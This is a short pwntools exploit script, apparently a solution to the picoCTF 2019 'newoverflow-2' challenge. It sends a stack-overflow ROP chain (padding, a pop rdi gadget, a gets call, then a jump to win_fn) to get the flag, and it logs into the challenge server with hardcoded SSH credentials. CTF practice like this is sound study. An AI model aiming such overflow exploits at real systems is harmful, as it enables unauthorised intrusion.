from pwn import *
import sys

argv = sys.argv
REMOTE = False
DEBUG = False

if len(argv) > 1:
	if argv[1] == 'remote':
		REMOTE = True
	if argv[1] == 'debug':
		DEBUG = True

if REMOTE:
	s = ssh(host='2019shell1.picoctf.com', user='yuvalyoBlup', password="123456789")
	sh = s.process('vuln', cwd='/problems/newoverflow-2_0_b7d9b3bbdbb843a28a13ff1aa57410df')
else:
	sh = process('./vuln')

e = ELF('./vuln')


def get_payload():
	overflow_offset = 64

	garbage = 'A' * overflow_offset
	fake_rbp = 'B' * 8
	pop_rdi_ret = p64(0x00000000004009a3) # pop rdi; ret
	win_vars = p64(e.symbols['win1'])
	gets_address = p64(0x0000000000400630)
	flag_function_address = p64(e.symbols['win_fn'])

	log.info('win vars: {}'.format(hex(e.symbols['win1'])))
	log.info('gets: {}'.format(hex(e.got['gets'])))
	log.info('flag func: {}'.format(hex(e.symbols['win_fn'])))

	return garbage + fake_rbp + pop_rdi_ret + win_vars + gets_address + flag_function_address 

if DEBUG:
	gdb.attach(sh, '''
		b* win_fn+88
		''')


payload = get_payload()

sh.sendlineafter("Welcome to 64-bit. Can you match these numbers?", payload)
sh.sendline('\x01\x01')


print sh.recvall()

